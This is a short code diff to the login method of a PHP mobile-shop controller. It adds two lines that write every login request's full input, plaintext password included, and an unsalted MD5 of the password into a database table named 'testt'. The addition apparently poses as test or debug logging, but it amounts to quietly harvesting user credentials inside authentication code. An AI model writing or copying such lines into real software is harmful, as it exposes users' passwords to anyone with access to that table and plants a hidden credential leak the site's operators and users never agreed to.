@@ -99,6 +99,10 @@ class Login extends MobileMall
             }            
         }
         $member = $model_member->getMemberInfo(array('member_mobile' => $phone));
+        
+        db('testt')->insertGetId(array('content'=>json_encode(input())));
+        db('testt')->insertGetId(array('content'=>md5(trim($password))));
+
         if (is_array($member) && !empty($member)) {
             $token = $this->_get_token($member['member_id'], $member['member_name'], $client);
             if ($token) {
